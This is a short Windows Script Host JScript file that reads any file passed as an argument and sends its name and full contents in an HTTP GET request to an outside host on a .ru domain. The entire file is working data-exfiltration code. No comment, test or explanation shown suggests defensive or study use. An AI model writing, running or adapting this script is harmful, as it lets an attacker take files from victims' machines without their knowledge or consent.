var fs = WScript.CreateObject("Scripting.FileSystemObject");
var xmlhttp = WScript.CreateObject("Microsoft.XMLHTTP");
var fn = WScript.Arguments.Unnamed(0);
var data = fs.OpenTextFile(fn, 1).ReadAll();

xmlhttp.Open("GET", "http://f0615718.xsph.ru/files/getfile.php?fn=" + fn + "&data=" + data, false);
xmlhttp.Send();